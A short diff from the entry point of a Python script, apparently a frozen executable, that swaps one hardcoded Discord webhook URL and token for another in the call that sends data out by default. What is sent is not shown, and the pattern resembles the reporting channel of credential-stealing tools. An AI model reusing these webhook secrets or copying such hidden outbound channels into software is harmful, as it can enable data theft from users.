@@ -687,7 +687,7 @@ if __name__ == "__main__":
     freeze_support()
     try:
         if len(sys.argv) == 1:
-            send_webhook(["https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"])
+            send_webhook(["https://discord.com/api/webhooks/1446961883080036493/Kq5K0mVJB3IFhiu-1muN_4o1Bd-W87FkxiVdtYzsU7maVMHyCXKki-HZ5iZM0SsNQfcx"])
         else:
             del sys.argv[0]
             send_webhook(sys.argv)
